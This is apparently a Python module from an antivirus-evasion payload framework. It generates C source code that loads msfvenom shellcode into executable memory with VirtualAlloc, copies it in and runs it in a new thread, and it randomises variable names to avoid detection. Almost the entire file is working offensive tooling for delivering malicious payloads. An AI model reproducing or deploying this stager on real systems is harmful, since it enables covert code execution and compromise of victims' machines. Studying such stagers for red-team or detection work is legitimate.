"""

C version of the VirtualAlloc pattern invoker.

Code adapted from:
http://www.debasish.in/2012/08/experiment-with-run-time.html


module by @christruncer

"""


from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "VirtualAlloc"
		self.description = "C VirtualAlloc method for inline shellcode injection"
		self.language = "c"
		self.rating = "Poor"
		self.extension = "c"
		
		# optional
		self.shellcode = shellcode.Shellcode()
		# options we require user ineraction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}

	def generate(self):
		
		# Generate Shellcode Using msfvenom
		Shellcode = self.shellcode.generate()
		
		# Generate Random Variable Names
		RandShellcode = randomizer.randomString()
		RandReverseShell = randomizer.randomString()
		RandMemoryShell = randomizer.randomString()

		# Start creating our C payload
		PayloadCode = '#include <windows.h>\n'
		PayloadCode += '#include <stdio.h>\n'
		PayloadCode += '#include <string.h>\n'
		PayloadCode += 'int main()\n'
		PayloadCode += '{\n'
		PayloadCode += '    LPVOID lpvAddr;\n'
		PayloadCode += '    HANDLE hHand;\n'
		PayloadCode += '    DWORD dwWaitResult;\n'
		PayloadCode += '    DWORD threadID;\n\n'
		PayloadCode += 'unsigned char buff[] = \n'
		PayloadCode += '\"' + Shellcode + '\";\n\n'
		PayloadCode += 'lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n'
		PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
		PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
		PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
		PayloadCode += 'return 0;\n'
		PayloadCode += '}\n'

		return PayloadCode
